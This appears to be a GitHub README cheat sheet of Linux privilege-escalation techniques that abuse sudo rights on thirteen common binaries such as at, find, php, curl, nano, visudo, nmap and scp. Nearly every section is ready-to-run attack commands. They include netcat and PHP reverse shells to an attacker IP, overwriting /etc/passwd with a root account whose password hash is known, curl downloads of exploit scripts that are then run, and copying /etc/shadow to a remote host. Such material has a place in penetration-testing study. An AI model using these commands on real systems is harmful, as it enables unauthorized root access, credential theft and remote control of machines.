# Linux Privilege Escalation

```NOTE: replace <IP> with attacker's IP (Your IP address)```

## 1. /usr/bin/at

```
ALL=(root) NOPASSWD: /usr/bin/at
```
 **Attacker's machine** 
  
 - start listner on port 4444 using netcat 
 ```
 nc -nvlp 4444
 ```
  
 **Victim's machine** 
  
 - create a bash file with this command
 ```
 echo "nc <IP> 4444 -e /bin/bash" > exp.sh
 ``` 
 - run this command and wait for one minute
 ```
 sudo at -f exp.sh now + 1 minutes
 ```
  
## 2. /usr/bin/find

```
ALL=(root) NOPASSWD: /usr/bin/find
```
 **Victim's machine**
  
 - create a bash file with this command
 ```
 echo "/bin/bash" > find.sh
 ```
 - pop root shell with this command
 ```
 sudo find /etc/passwd -type f -name "passwd" -exec bash find.sh "{}" \;
 ```
  
## 3. /usr/bin/php

```
ALL=(root) NOPASSWD: /usr/bin/php
```
 **Attacker's machine**
  
 - start listner on port 1234 using netcat 
 ```
 nc -nvlp 1234
 ```
  
 **Victim's machine**
  
 - run this command to create a php file
 ```
 echo "<?php shell_exec('nc <IP> 1234 -e /bin/sh');?>" > shell.php
 ```
 - pop up root shell
 ```
 sudo php shell.php
 ```

## 4. /usr/bin/curl

```
ALL=(root) NOPASSWD: /usr/bin/curl
```

 **Attacker's machine**
  
 - Copy /etc/passwd from victim's machine and save it on attacker's machine as pass.txt
 - add this line at the end of the file (pass.txt)
 ```
 pwn:$1$pwn$AxNbnbaujRUXRur/DewJ8/:0:0:/root/root:/bin/bash
 ```
 - start http server using python
 ```
 python -m SimpleHTTPServer 8080
 ```
  
  
 **Victim's machine**
  
 - run this command
 ```
 sudo curl http://<IP>:8080/pass.txt -o /etc/passwd
 ```
 - change user to **pwn** using password **pwn** 
 ```
 su pwn
 ```
 
## 5. /usr/bin/pip3 OR /usr/bin/pip

```
ALL=(root) NOPASSWD: /usr/bin/pip3
```
 **Attacker's machine**
 
 - start listner on port 4444 using netcat 
 ```
 nc -nvlp 4444
 ```
 
 **Victim's machine**
 
 - Download our modified exploit using curl 
 ```
 curl https://raw.githubusercontent.com/theamanrawat/privilege-escalation/master/Linux/pip_exp.py?token=AISTJLQB7CDRPQS3OWODDE27E23S2 -o exploit.py
 ```
 - run this exploit and wait for few seconds
 ```
 python3 exploit.py <IP> 4444 /usr/bin/pip3
 ```
 
## 6. /usr/bin/nano
 
```
ALL=(root) NOPASSWD: /usr/bin/nano
```
 **Victim's machine**
  
 - edit /etc/passwd file 
 ```
 sudo nano /etc/passwd
 ```
 - add this line at the end of the file and save it
 ```
 pwn:$1$pwn$AxNbnbaujRUXRur/DewJ8/:0:0:/root/root:/bin/bash
 ```
 - change user to **pwn** using password **pwn**
 ```
 su pwn
 ```
  
## 7. /usr/sbin/visudo
  
```
ALL=(root) NOPASSWD: /usr/sbin/visudo
```
 **Victim's machine**
   
 - run this command to get current user
 ```
 whoami
 ```
 - edit the permission for current user using this command
 ```
 sudo visudo
 ```
 - add # in start of name which you got from whoami (in first step) and add this line (replace <USER> with current user)
 ```
 <USER> ALL=(root) NOPASSWD: ALL
 ```
 - save it and run this command to pop up root shell
 ```
 sudo /bin/sh
 ```
  
## 8. /usr/bin/less
  
```
ALL=(root) NOPASSWD: /usr/bin/less
```
 **Victim's machine**
  
 - run this command to open /etc/passwd
 ```
 sudo less /etc/passwd
 ```
 - pop up root shell using this command
 ```
 ! /bin/sh
 ```
  
## 9. /usr/bin/ftp
  
```
ALL=(root) NOPASSWD: /usr/bin/ftp
```
 **Victim's machine**
  
 - open FTP shell using this command
 ```
 sudo ftp
 ```
 - pop root shell using this command
 ```
 ! /bin/sh
 ```
  
## 10. /usr/bin/man

```
ALL=(root) NOPASSWD: /usr/bin/man
```

 same as [/usr/bin/less](https://github.com/theamanrawat/privilege-escalation/blob/master/Linux/README.md#8-usrbinless)
 
## 11. /usr/bin/nmap

```
ALL=(root) NOPASSWD: /usr/bin/nmap
```
 **Victim's machine**
 
 - download malicious script using this command
 
 ```
 curl https://raw.githubusercontent.com/theamanrawat/privilege-escalation/master/Linux/nmap.lua?token=AISTJLQ6WEAQ3F3TNHVSR327E3FQW -o nmap.lua
 ```
 - pop root shell using nmap
 ```
 nmap 127.0.0.1 --script nmap.lua
 ```
 
## 12. /usr/bin/awk

```
ALL=(root) NOPASSWD: /usr/bin/awk
```

 **Victim's machine**
 
 - run this command to pop up root shell
 ```
 sudo awk '{system("/bin/sh")}'
 ```
 
 
  # 13. Spawn shell through SCP 
 
  - we can use it for transferring those system files which requires root permission to perform read/write operation such as /etc/passwd and /etc/shadow files
  `````````
  sudo scp /etc/passwd mayank@192.168.1.105:~/
  sudo scp /etc/shadow mayank@192.168.1.105:~/
  ``````````
